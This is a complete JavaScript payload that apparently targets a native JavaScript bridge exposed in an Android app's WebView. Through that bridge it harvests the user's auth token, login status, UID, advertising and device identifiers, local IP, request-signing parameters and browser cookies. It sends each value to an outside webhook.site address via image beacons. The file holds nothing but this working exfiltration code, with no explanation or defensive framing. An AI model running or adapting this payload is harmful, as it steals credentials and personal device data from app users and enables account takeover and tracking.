(function(){
var C='https://webhook.site/21804ae7-cd66-4ff6-973e-c686c7ff043e';
var T=Date.now();
function b(t,d){new Image().src=C+'?t='+encodeURIComponent(t)+'&d='+encodeURIComponent(String(d||'').substring(0,2000))+'&ts='+T;}
  
b('START','v22.2.00.02');
b('URL',location.href.substring(0,400));
b('ORIGIN',location.origin);
b('H5I',typeof H5Interface);
b('ACCT',typeof AccountInfo);
b('AWC',typeof AppWebClient);

var bridge = window.H5Interface || window.AccountInfo;
if(bridge){
  b('TOKEN',bridge.getToken());
  b('LOGIN',bridge.checkLoginStatus());
  b('OAID',bridge.getOaid());
  b('VAID',bridge.getVaid());
  b('AAID',bridge.getAaid());
  b('UID',bridge.getU());
  b('LOCAL_IP',bridge.getLocalIpAddress());
  b('CPU',bridge.getCpuInfo());
  b('MODEL',bridge.getModel());
  b('USER_AGENT',bridge.getUa());
  b('ANDROID_SDK',bridge.getAv());
  b('VOS',bridge.getVOs());
  b('VAPP',bridge.getVApp());
  b('SIGN_PARAMS',bridge.h5GetSignParams('https://video-activity.vivo.com.cn/api/test'));
  b('FEATURES',bridge.getFeatureList());
  b('PRIVACY_VER',bridge.getPrivacyVersion());
  b('START_SRC',bridge.getStartSource());
  b('NET_TYPE',bridge.getNetType());
  b('FT',bridge.getFt());
  b('URL_AD_CFG',bridge.getUrlAdTaskConfig());
  b('APP_NAME',bridge.getAppName());
  b('UI_MODE',bridge.getCurrentUiMode());
  b('IS_VV_INSTALLED',bridge.isInstalledApp('com.android.VideoPlayer'));
  b('APP_VER',bridge.getAppVersion('com.android.VideoPlayer'));
  b('IS_MODE_NIGHT',bridge.isMode('night'));
  b('COOKIE',document.cookie.substring(0,2000));
}
b('DONE','ok');
})();
